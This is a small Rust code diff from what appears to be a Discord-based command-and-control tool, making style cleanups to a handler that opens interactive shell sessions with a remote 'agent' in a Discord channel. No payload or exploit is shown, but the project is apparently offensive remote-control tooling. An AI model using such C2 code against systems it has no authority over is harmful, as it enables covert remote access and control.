@@ -107,7 +107,7 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
 
 
     // Create a channel for the remote session, and set the name/topic appropriately
-    let session_channel = create_text_channel(&ctx, &*now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
+    let session_channel = create_text_channel(ctx, &now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
     agent.set_session_channel(Some(session_channel))?; // Update the agent's session channel attribute (this also updates the JSON configuration).
 
     let string = format!(
@@ -132,7 +132,7 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
         };
         Ok((content.parse().unwrap(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
     } else {
-        return Ok(("No options were specified.".to_string(), None));
+        Ok(("No options were specified.".to_string(), None))
     }
 }
 
@@ -169,8 +169,8 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
 /// agent has been initialized. It also assumes that the `session::run` function returns a message string
 /// followed by an optional `ShellType` object.
 pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
-    let (content, shell) = run(&ctx, &command.data.options).await?;
-    ephemeral_interaction_create(&ctx, command, &content).await?;
+    let (content, shell) = run(ctx, &command.data.options).await?;
+    ephemeral_interaction_create(ctx, command, &content).await?;
 
     let shell_type = shell.ok_or(DiscordC2Error::AgentError("Shell was not properly created".parse().unwrap()))?;
 
